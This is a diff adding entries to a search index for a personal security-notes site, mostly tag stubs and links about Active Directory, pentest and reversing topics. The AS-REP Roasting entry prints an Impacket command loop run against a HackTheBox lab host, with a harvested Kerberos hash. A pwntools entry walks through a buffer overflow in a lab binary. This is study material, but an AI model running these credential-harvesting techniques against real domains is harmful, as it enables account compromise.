@@ -58,6 +58,26 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/posts\/active_directory_certificate_services_pentest\/": {
+        
+        "title": "#\u002btitle: Pentest - Active Directory - Certificate Services",
+        "tags": ["cert","activeDirectory","pentest",],
+        "content": "Active Directory Certificate Services social.technet.microsoft.com\nActive Directory Certificate Services (AD CS) is an Active Directory server role which allows users to build PKI (Public Key Infrastructure). This can provide practical solutions for VPN access, SSL/TLS certificates and smart card logons, amongst other similar ubiquitous technologies you are likely to encounter on a daily basis. medium - shaun whorton\nAbusing misconfigured certificate templates Use Certify.exe to enumerate Certificate Services GhostPack/Certify\nPS C:\\ \u0026gt; .\\Certify.exe find /vulnerable Here\u0026rsquo;s an example of a vulnerable cert template, which is used for client authentication. Domain Users have enrollments rights, and they\u0026rsquo;re also permitted to supply the subject (msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT)\n#+ATTR_ORG :width 1200 specterops - certified pre-owned\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/active_directory_certificate_services_pentest\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/pentesting_mssql_microsoft_sql_server\/": {
+        
+        "title": "1433 - Pentesting MSSQL - Microsoft SQL Server",
+        "tags": ["sql","pentest",],
+        "content": "hacktricks\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/pentesting_mssql_microsoft_sql_server\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/tags\/abortion\/": {
         
         "title": "abortion",
@@ -138,6 +158,16 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/posts\/ansible_playbook_weaponization\/": {
+        
+        "title": "Ansible - Playbook weaponization",
+        "tags": ["pentest",],
+        "content": "https://rioasmara.com/2022/03/21/ansible-playbook-weaponization/\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/ansible_playbook_weaponization\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/tags\/antivirus\/": {
         
         "title": "antivirus",
@@ -148,12 +178,32 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/tags\/architecture\/": {
+        
+        "title": "architecture",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/architecture\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/posts\/as_rep_roasting\/": {
         
         "title": "AS-REP Roasting",
         "tags": ["impacket","pentest","kerberoasting","kerberos","Windows",],
         "content": "AS-REP Roasting Two key attacks on Kerberos security in Active Directory include kerberoasting and AS-REP Roasting. Kerberoasting typically requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.\nUse the Impacket tool GetNPUsers.py to try to get a hash for each user\nλ ~/ctf/htb/forest/ for user in $(cat usernames.txt); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done [*] Getting TGT for sebastien [-] User sebastien doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [*] Getting TGT for lucinda [-] User lucinda doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [*] Getting TGT for svc-alfresco $krb5asrep$23$svc-alfresco@HTB:25311259ddd6d0e65a4ae2cd898c547b$2328b382956004167ef612abbfd0b3350d362f386d70deadf093d73dd33fadea8bf648d3d7c1cab3565b508a9dafb06cb399ac26e04521ffa22edc882213994257e53976a81b78aaf49dfe02da14f6f76fc7def2a7d4e7e8ff696efa29a1ac4a8df2c0f7856df3c7aa7bbff60e93c1e1fbfc538745a0ffefa3f383d68ddfb4984d1194bc56cc9d168b69a512901815da53cba71a2d0a13c6369fd1b74b9ce3367119502354b2cae4ae3096e5ba4a041fa8a0d1d7f4a92c0f47d2c6ee7bcc73b7f2c3b10955799c807bf43d3035488fb385c68568e770d87d771343e16266ea8f [*] Getting TGT for andy [-] User andy doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [*] Getting TGT for mark [-] User mark doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [*] Getting TGT for santi [-] User santi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set The hash is quickly cracked with hashcat.\n", 
         "url": "https:\/\/kdbed.github.io\/posts\/as_rep_roasting\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/tags\/auth\/": {
+        
+        "title": "auth",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/auth\/"
     },
     
     
@@ -184,6 +234,26 @@ window.store = {
         "tags": ["hashCollision","hashes","securityPlus",],
         "content": "Birthday Attack The birthday attack is named after the birthday paradox. The name is based on fact that in a room with 23 people or more, the odds are greater than 50% that two will share the same birthday. Many find this counterintuitive, and the birthday paradox illustrates why many people’s instinct on probability (and risk) is wrong. You are not trying to match a specific birthday (such as yours); you are trying to match any birthday.\nIf you are in a room full of 23 people, you have a 1 in 365 chance of sharing a birthday with each of the 22 other people in the room, for a total of 22/365 chances. If you fail to match, you leave the room and Joe has a 21/365 chance of sharing a birthday with the remaining people. If Joe fails to match, he leaves the room and Morgan has a 20/365 chance, and so on. If you add 22/365 + 21/365 + 20/365 + 19/365 … + 1/365, you pass 50% probability.\nThe birthday attack is used to create hash collisions. Just as matching your birthday is difficult, finding a specific input with a hash that collides with another input is difficult. However, just like matching any birthday is easier, finding any input that creates a colliding hash with any other input is easier due to the birthday attack.\nComptTIA Security+ ", 
         "url": "https:\/\/kdbed.github.io\/posts\/birthdayattack\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/tags\/browser\/": {
+        
+        "title": "browser",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/browser\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/c_stl\/": {
+        
+        "title": "C\u002b\u002b - STL",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/posts\/c_stl\/"
     },
     
     
@@ -228,6 +298,16 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/tags\/cert\/": {
+        
+        "title": "cert",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/cert\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/tags\/climate\/": {
         
         "title": "climate",
@@ -258,12 +338,32 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/tags\/computation\/": {
+        
+        "title": "computation",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/computation\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/posts\/computer_science\/": {
         
         "title": "Computer Science",
         "tags": [],
         "content": "", 
         "url": "https:\/\/kdbed.github.io\/posts\/computer_science\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/tags\/computerscience\/": {
+        
+        "title": "computerScience",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/computerscience\/"
     },
     
     
@@ -334,6 +434,16 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "https:\/\/kdbed.github.io\/tags\/cryptography\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/dll_hijacking\/": {
+        
+        "title": "DLL Hijacking",
+        "tags": ["privesc","exploit","windowsExploitation",],
+        "content": "Basic Ideas Windows DLL hijacking occurs when a trusted or legitimate application is tricked into loading an arbitrary DLL. Dll hijacking can be used to execute code, obtain persistence and escalate privileges, although privilege escalation is the least likely. hackTricks\nApproaches There are different approaches to DLL hijacking, and success will be determined by how the application is set to load its DLLs.\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/dll_hijacking\/"
     },
     
     
@@ -478,6 +588,16 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/tags\/exploit\/": {
+        
+        "title": "exploit",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/exploit\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/posts\/fileless_malware\/": {
         
         "title": "Fileless Malware",
@@ -578,6 +698,16 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/posts\/http_2\/": {
+        
+        "title": "HTTP\/2",
+        "tags": [],
+        "content": "https://portswigger.net/research/http2\nRequest smuggling https://lab.wallarm.com/http2smugl-http2-request-smuggling-security-testing-tool/\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/http_2\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/posts\/identityiqessentialsintroduction\/": {
         
         "title": "IdentityIQEssentialsIntroduction",
@@ -642,7 +772,7 @@ window.store = {
         
         "title": "Intro to Pwntools - TryHackMe",
         "tags": ["binary","pwntools","pwn","tryHackMe",],
-        "content": "Basics of Binary Analysis\nIntro to Pwntools Source materials here dizmascyberlabs Install gdb-pwndbg-peda-gef\nChecksec Same source code, compiled with different protections in place:\n1 checksec checksec/intro2pwn2 1 checksec checksec/intro2pwn1 RELRO = Relocation Read-Only; makes the global offset table (GOT) read-only after the linker resolves functions to it. The GOT is important for techniques such as the ret-to-libc attack Stack Canaries = tokens placed after a stack to detect a stack overflow. Stack canaries sit beside the stack in memory (where the program variables are stored), and if there is a stack overflow, then the canary will be corrupted. This allows the program to detect a buffer overflow and shut down. NX = NX is short for non-executable. If this is enabled, then memory segments can be either writable or executable, but not both. This stops potential attackers from injecting their own malicious code (called shellcode) into the program, because something in a writable segment cannot be executed. On the vulnerable binary, you may have noticed the extra line RWX that indicates that there are segments which can be read, written, and executed. wiki PIE = PIE stands for Position Independent Executable. This loads the program dependencies into random locations, so attacks that rely on memory layout are more difficult to conduct. redhat Resource for properties involved in checksec : siphos\nCyclic If we look at the files and permissions in the cyclic directory:\nYou will see that the flag file and intro2pwn3 are owned by the same user, and that the suid bit is set for intro2pwn3. This means that the program will keep its permissions when it executes.\nTaking a look at the c code:\n1 cat cyclic/test_cyclic.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void print_flag() { printf(\u0026#34;Getting Flag:\\n\u0026#34;); fflush(stdout); char *cat_flag[3] = {\u0026#34;/bin/cat\u0026#34;, \u0026#34;flag.txt\u0026#34;, NULL}; execve(\u0026#34;/bin/cat\u0026#34;, cat_flag, NULL); exit(0); } void start(){ char name[24]; gets(name); } int main(){ printf(\u0026#34;I run as dizmas.\\n\u0026#34;); printf(\u0026#34;Who are you?: \u0026#34;); start(); } We see that although we (buzz) can run this program, the print_flag() function isn\u0026rsquo;t executed. This program is vulnerable to a buffer overflow, because it uses the gets() function, which does not check to see if the user input is actually in bounds. In our case, the name variable has 24 bytes allocated, so if we input more than 24 bytes, we can write to other parts of memory. An important part of the memory we can overwrite is the instruction pointer (IP), which is called the eip on 32-bit machines, and rip on 64-bit machines. The IP points to the next instruction to be executed, so if we redirect the eip in our binary to the print_flag() function, we can print the flag.\nCyclic To control the IP, the first thing we need do is to is overflow the stack with a pattern, so we can see where the IP is. A file alphabet is provided; start gdb with gdb intro2pwn3 and run with the alphabet file r \u0026lt; alphabet:\nWe\u0026rsquo;ve caused a segmentation fault, and you may observe that there is an invalid address at 0x4a4a4a4a. If you scroll up, you can see the values at each register. For eip, it has been overwritten with 0x4a4a4a4a.\nThe alphabet file can be produced with cyclic 100.\n1 cyclic 100 ", 
+        "content": "Basics of Binary Analysis\nIntro to Pwntools Source materials here dizmascyberlabs Install gdb-pwndbg-peda-gef\nChecksec Same source code, compiled with different protections in place:\n1 checksec checksec/intro2pwn2 [*] \u0026#39;/home/kdb/Downloads/IntroToPwntools/IntroToPwntools/checksec/intro2pwn2\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 1 checksec checksec/intro2pwn1 [*] \u0026#39;/home/kdb/Downloads/IntroToPwntools/IntroToPwntools/checksec/intro2pwn1\u0026#39; Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RELRO = Relocation Read-Only; makes the global offset table (GOT) read-only after the linker resolves functions to it. The GOT is important for techniques such as the ret-to-libc attack Stack Canaries = tokens placed after a stack to detect a stack overflow. Stack canaries sit beside the stack in memory (where the program variables are stored), and if there is a stack overflow, then the canary will be corrupted. This allows the program to detect a buffer overflow and shut down. NX = NX is short for non-executable. If this is enabled, then memory segments can be either writable or executable, but not both. This stops potential attackers from injecting their own malicious code (called shellcode) into the program, because something in a writable segment cannot be executed. On the vulnerable binary, you may have noticed the extra line RWX that indicates that there are segments which can be read, written, and executed. wiki PIE = PIE stands for Position Independent Executable. This loads the program dependencies into random locations, so attacks that rely on memory layout are more difficult to conduct. redhat Resource for properties involved in checksec : siphos\nCyclic If we look at the files and permissions in the cyclic directory:\nYou will see that the flag file and intro2pwn3 are owned by the same user, and that the suid bit is set for intro2pwn3. This means that the program will keep its permissions when it executes.\nTaking a look at the c code:\n1 cat cyclic/test_cyclic.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void print_flag() { printf(\u0026#34;Getting Flag:\\n\u0026#34;); fflush(stdout); char *cat_flag[3] = {\u0026#34;/bin/cat\u0026#34;, \u0026#34;flag.txt\u0026#34;, NULL}; execve(\u0026#34;/bin/cat\u0026#34;, cat_flag, NULL); exit(0); } void start(){ char name[24]; gets(name); } int main(){ printf(\u0026#34;I run as dizmas.\\n\u0026#34;); printf(\u0026#34;Who are you?: \u0026#34;); start(); } We see that although we (buzz) can run this program, the print_flag() function isn\u0026rsquo;t executed. This program is vulnerable to a buffer overflow, because it uses the gets() function, which does not check to see if the user input is actually in bounds. In our case, the name variable has 24 bytes allocated, so if we input more than 24 bytes, we can write to other parts of memory. An important part of the memory we can overwrite is the instruction pointer (IP), which is called the eip on 32-bit machines, and rip on 64-bit machines. The IP points to the next instruction to be executed, so if we redirect the eip in our binary to the print_flag() function, we can print the flag.\nCyclic To control the IP, the first thing we need do is to is overflow the stack with a pattern, so we can see where the IP is. A file alphabet is provided; start gdb with gdb intro2pwn3 and run with the alphabet file r \u0026lt; alphabet:\nWe\u0026rsquo;ve caused a segmentation fault, and you may observe that there is an invalid address at 0x4a4a4a4a. If you scroll up, you can see the values at each register. For eip, it has been overwritten with 0x4a4a4a4a.\nThe alphabet file can be produced with cyclic 100.\n1 cyclic 100 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa ", 
         "url": "https:\/\/kdbed.github.io\/posts\/introtopwntools\/"
     },
     
@@ -748,12 +878,42 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/posts\/lang_test\/": {
+        
+        "title": "Lang - Test",
+        "tags": [],
+        "content": " extern crate regex; use regex::Regex; fn main() { let re = Regex::new(r\u0026#34;^\\d{4}-\\d{2}-\\d{2}$\u0026#34;).unwrap(); println!(\u0026#34;test\u0026#34;); assert!(re.is_match(\u0026#34;2014-01-01\u0026#34;)); } 1 2 3 4 5 #include \u0026lt;iostream\u0026gt; int main(){ std::cout\u0026lt;\u0026lt;\u0026#34;Hello, World.\\n\u0026#34;; return 0; } Hello, World. 1 2 3 4 5 6 7 8 9 10 11 // Hello World! program namespace HelloWorld { class Hello { static void Main(string[] args) { System.Console.WriteLine(\u0026#34;Hello World!\u0026#34;); } } } Hello World! ", 
+        "url": "https:\/\/kdbed.github.io\/posts\/lang_test\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/rust_test\/": {
+        
+        "title": "Lang - Test",
+        "tags": [],
+        "content": " extern crate regex; use regex::Regex; fn main() { let re = Regex::new(r\u0026#34;^\\d{4}-\\d{2}-\\d{2}$\u0026#34;).unwrap(); println!(\u0026#34;test\u0026#34;); assert!(re.is_match(\u0026#34;2014-01-01\u0026#34;)); } 1 2 3 4 5 #include \u0026lt;iostream\u0026gt; int main(){ std::cout\u0026lt;\u0026lt;\u0026#34;Hello, World.\\n\u0026#34;; return 0; } Hello, World. ", 
+        "url": "https:\/\/kdbed.github.io\/posts\/rust_test\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/posts\/lastlogon_vs_lastlogontimestamp\/": {
         
         "title": "lastLogon vs lastLogonTimestamp",
         "tags": ["kerberos","activeDirectory",],
         "content": "lastLogon vs lastLogonTimestamp If you ask for types of situations, then any logon event updates the lastlogontimestamp, but only some of them update lastlogon attribute.\nThere are certain types of events that only emulate the logon without using the actual username and password that update only the lastlogon attribute.\nKerberos S4u2Self How LastLogonTimeStamp is Updated with Kerberos S4u2Self S4U2self\n", 
         "url": "https:\/\/kdbed.github.io\/posts\/lastlogon_vs_lastlogontimestamp\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/lateral_movement\/": {
+        
+        "title": "Lateral Movement",
+        "tags": ["pivoting","pentest",],
+        "content": "Lateral Movement The adversary is trying to move through your environment.\nLateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier.\nMITRE attack.mitre ", 
+        "url": "https:\/\/kdbed.github.io\/posts\/lateral_movement\/"
     },
     
     
@@ -988,6 +1148,76 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/posts\/pentest_active_directory\/": {
+        
+        "title": "Pentest - Active Directory",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/posts\/pentest_active_directory\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_dcsync\/": {
+        
+        "title": "Pentest - Active Directory - DCSync",
+        "tags": ["exploit","pentest","windowsExploitation",],
+        "content": "hacktricks - DCSync\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_dcsync\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_sid_history_injection\/": {
+        
+        "title": "Pentest - Active Directory - SID-History Injection",
+        "tags": ["windowsExploitation","activeDirectory","pentest",],
+        "content": "SentinelOne\nADSecurity\nMITRE\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_sid_history_injection\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_skeleton_key\/": {
+        
+        "title": "Pentest - Active Directory - Skeleton Key",
+        "tags": ["activeDirectory","windowsExploitation","pentest",],
+        "content": "hacktricks\nnetwrix\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_skeleton_key\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/pentest_generatingwordlists\/": {
+        
+        "title": "Pentest - Generating Wordlists",
+        "tags": ["wordlists","pentest",],
+        "content": "Generating Wordlists Username anarchy http://morningstarsecurity.com/research/username-anarchy https://github.com/urbanadventurer/username-anarchy/\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/pentest_generatingwordlists\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/pentest_passive_information_gathering\/": {
+        
+        "title": "Pentest - Passive Information Gathering",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/posts\/pentest_passive_information_gathering\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/pentest_python\/": {
+        
+        "title": "Pentest - Python",
+        "tags": [],
+        "content": "Vulnerability in str.format() in Python https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/pentest_python\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/posts\/pentest_smb_p_139_445\/": {
         
         "title": "Pentest - SMB p 139,445",
@@ -1018,6 +1248,16 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/posts\/pentest_stealing_chrome_cookies\/": {
+        
+        "title": "Pentest - Stealing Chrome Cookies",
+        "tags": ["web","browser","pentest",],
+        "content": "Stealing Chrome Cookies source: mango.pdf.zone\nUsing Chrome\u0026rsquo;s remote debugging protocol to steal cookies. github - defaultnamehere\nrequires rce on victim\u0026rsquo;s machine ", 
+        "url": "https:\/\/kdbed.github.io\/posts\/pentest_stealing_chrome_cookies\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/posts\/philosophy\/": {
         
         "title": "philosophy",
@@ -1044,6 +1284,16 @@ window.store = {
         "tags": [],
         "content": "Binary Analysis\n", 
         "url": "https:\/\/kdbed.github.io\/posts\/pie\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/tags\/pivoting\/": {
+        
+        "title": "pivoting",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/pivoting\/"
     },
     
     
@@ -1318,6 +1568,46 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/posts\/reverse_shell_upgrade_tty\/": {
+        
+        "title": "Reverse Shell - Upgrade TTY",
+        "tags": ["revshell","pentest",],
+        "content": "Reverse Shells then\nwhen python isn\u0026rsquo;t available.\nrev shell without python\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/reverse_shell_upgrade_tty\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/tags\/reversing\/": {
+        
+        "title": "reversing",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/reversing\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/reversing_python\/": {
+        
+        "title": "Reversing - Python",
+        "tags": ["unpacking","python","reversing",],
+        "content": "Unpacking Python Executables fortinet\nextraction pyinstxtractor - extract the contents of a PyInstaller generated executable file\ndecompile pycdc\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/reversing_python\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/tags\/revshell\/": {
+        
+        "title": "revshell",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/revshell\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/tags\/rust\/": {
         
         "title": "rust",
@@ -1518,6 +1808,26 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/posts\/sql_injection\/": {
+        
+        "title": "SQL Injection",
+        "tags": ["sqli","pentest",],
+        "content": "SQL Injection SQLi - websocket rayhan0x01 blind sql injection via websocket\nFrom the above post\n\u0026ldquo;If you didn\u0026rsquo;t know, the main difference between HTTP and WebSocket is that HTTP is built on a request-response model whereas WebSocket is like a Socket connection where both client and server can send data anytime asynchronously. So you can\u0026rsquo;t repeat the requests made in WebSocket as you would normally do for HTTP Requests in BurpSuite.\u0026rdquo;\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/sql_injection\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/tags\/sqli\/": {
+        
+        "title": "sqli",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/sqli\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/tags\/ssh\/": {
         
         "title": "ssh",
@@ -1598,6 +1908,16 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/tags\/tools\/": {
+        
+        "title": "tools",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/tools\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/tags\/trump\/": {
         
         "title": "trump",
@@ -1628,6 +1948,26 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/tags\/unpacking\/": {
+        
+        "title": "unpacking",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/unpacking\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/von_neumann_architecture\/": {
+        
+        "title": "von Neumann Architecture",
+        "tags": ["computation","architecture","computerScience",],
+        "content": "von Neumann Architecture ", 
+        "url": "https:\/\/kdbed.github.io\/posts\/von_neumann_architecture\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/tags\/web\/": {
         
         "title": "web",
@@ -1644,6 +1984,16 @@ window.store = {
         "tags": [],
         "content": "wappalyzer Wappalyzer is a browser extension that uncovers the technologies used on websites. It detects content management systems, eCommerce platforms, web servers, JavaScript frameworks, analytics tools and many more.\n", 
         "url": "https:\/\/kdbed.github.io\/posts\/web_pentest_browser_extensions\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/web_pentest_tools\/": {
+        
+        "title": "Web Pentest - Tools",
+        "tags": ["pentest","web","tools",],
+        "content": "Web Pentest Tools web brutator https://github.com/koutto/web-brutator https://blog.zufan.me/Web-Brutator/\nyupysubdo https://github.com/0xYP/yupysubdo subdomain finder\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/web_pentest_tools\/"
     },
     
     
@@ -1684,6 +2034,36 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "https:\/\/kdbed.github.io\/tags\/windows\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/tags\/windowsexploitation\/": {
+        
+        "title": "windowsExploitation",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/windowsexploitation\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/tags\/wordlists\/": {
+        
+        "title": "wordlists",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/wordlists\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/x11_authorization\/": {
+        
+        "title": "X11 Authorization",
+        "tags": ["auth","linux",],
+        "content": "X11 Authorization https://stackoverflow.com/questions/37157097/how-does-x11-authorization-work-mit-magic-cookie/37367518#37367518\nWell, first of all there is a file ~/.Xauthority on the machine. Notice that (usually on machine with GUI) wrong permissions of this file, can cause a login screen loop\u0026hellip; (took me hours to understand that).\nAs you mentioned there are 5 mechanisms:\nHost access: the server has host access list (if a network address exists in this list, the connection is permitted). the list is managed using xhost command. NOTE: this doesn\u0026rsquo;t allow more than a single connection simultaneously. I don\u0026rsquo;t know more about this method because I don\u0026rsquo;t really used it. but you can see man Xserver GRANTING ACCESS section :)\nMIT-magic-cookie-1: Generating 128bit of key (\u0026ldquo;cookie\u0026rdquo;), storing it in ~/.Xauthority (or where XAUTHORITY envvar points to). The client sends it to server plain! the server checks whether it has a copy of this \u0026ldquo;cookie\u0026rdquo; and if so, the connection is permitted. the key is generated by DMX.\nXDM-authorization-1: Again, there is a key stored in ~/.Xauthority. this key consists 2 parts- 56bit DES encryption key and 64bits of random data used as the authenticator. When you connect to the server the client generate 192bits of data: ctime combined with 48bits identifier (for tcp/ip: ip address+port, for local connections it\u0026rsquo;s the PID and 32 bit unique id). the DES key is used to encrypt the data and then it is sent to server. the server validate the user by decrypting it then validating the 64bits authenticator and additional data.\nsun-des-1: it uses asymmetric encryption, the server has a public key which he uses to decrypt incomming requests. it also uses the \u0026ldquo;host list\u0026rdquo;. This require some additional mechanisms in the network, I don\u0026rsquo;t have such network so again, I don\u0026rsquo;t understand this mechanism well.\nserver interpreted: It can be implemented in so many ways\u0026hellip; but in general, the client send 2 string to server. The second string is the user entry (such as username) and the first string is the entry type (such as localuser).\nNOTE: the 2nd, 3rd and 4th mechanisms store the keys inside ~/.Xauthority therefore anyone who has access to this file, can connect to the server pretending to be \u0026ldquo;you\u0026rdquo;.\nxauth command can parse Xauthority file and extract the interesting values.\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/x11_authorization\/"
     },
     
     
